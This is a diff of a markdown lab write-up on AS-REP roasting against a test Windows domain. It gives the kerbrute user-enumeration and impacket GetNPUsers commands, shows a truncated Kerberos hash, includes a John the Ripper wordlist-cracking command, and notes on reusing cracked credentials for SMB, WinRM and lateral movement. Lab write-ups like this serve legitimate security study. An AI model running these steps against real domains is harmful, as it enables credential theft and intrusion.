@@ -1,38 +1,34 @@
+# 🔐 AS-REP Roasting & Kerberos Enumeration - 2025-04-24
 
-markdown
-Copy
-Edit
-# 🔐 AS-REP Roasting & Kerberos Enumeration (2025-04-24)
-
-**Target:** 192.168.1.2 (Windows Server 2025 - `narnia.com`)  
-**Attacker Machine:** Kali Linux (`192.168.1.10`)  
-**Tools Used:** `kerbrute`, `impacket` (GetNPUsers.py)
+**Target:** 192.168.1.2 (Windows Server 2025)  
+**Domain:** narnia.com  
+**Attacker:** Kali Linux (192.168.1.10)  
+**Tools:** kerbrute, impacket (GetNPUsers.py)
 
 ---
 
-## 🎯 Goal
-
-- Identify valid domain usernames
-- Test for Kerberos accounts with "Do not require pre-authentication"
-- Retrieve AS-REP hashes for offline cracking
+## 🎯 Objective
+- Enumerate valid domain users
+- Identify accounts with Kerberos pre-auth disabled
+- Capture AS-REP hashes for offline cracking
 
 ---
 
-## 🧰 Step 1: Kerbrute Enumeration
+## 🧪 Step 1: Enumerating Users via Kerbrute
 
 **Command:**
 ```bash
 kerbrute userenum --dc 192.168.1.2 -d narnia.com usernames.txt
-Result:
+Output:
 
 pgsql
 Copy
 Edit
 [*] Valid user found: administrator@narnia.com
 [*] Valid user found: jdoe@narnia.com
-✅ 2 valid usernames identified
+✅ Found valid domain users
 
-🧰 Step 2: AS-REP Roasting with Impacket
+🔍 Step 2: AS-REP Roasting via Impacket
 Command:
 
 bash
@@ -40,36 +36,36 @@ Copy
 Edit
 cd ~/impacket/examples
 python3 GetNPUsers.py -dc-ip 192.168.1.2 narnia.com/ -usersfile usernames.txt -no-pass
-Result:
+Output (sample):
 
-plaintext
+bash
 Copy
 Edit
-[*] Found user administrator with no pre-auth required
-$krb5asrep$23$administrator@NARNIA.COM:...
-...
-✅ AS-REP hash retrieved
-🛠️ Next step: crack it with John the Ripper
+$krb5asrep$23$administrator@narnia.com:...<HASH_SNIPPED>...
+✅ Extracted AS-REP hash for offline cracking
 
-🔓 Step 3: Cracking Hash
+🧨 Step 3: Crack the Hash (Next Step)
 Command:
 
 bash
 Copy
 Edit
 john --wordlist=/usr/share/wordlists/rockyou.txt hashfile
-(Pending...)
+🔄 Cracking in progress…
 
-🗂️ Notes
-Only users with no-preauth will show AS-REP hashes
+📝 Notes
+AS-REP roasting only works if pre-auth is disabled
 
-AS-REP hashes are Type 23 and can be cracked offline
+Hashes can be cracked offline to retrieve cleartext passwords
 
-If cracked, use credentials for WinRM or SMB access
+Credentials can be reused for SMB, WinRM, or lateral movement
 
 ✅ Summary
 
-Stage	Status
-Valid users found	✅ (2)
-AS-REP hash found	✅ (administrator)
-Hash cracked	🔄 Pending
+Task	Status
+User enum with Kerbrute	✅
+AS-REP hash retrieved	✅
+Hash cracking	🔄 Pending
+🧪 Next action: Crack and test credentials via evil-winrm
+
+
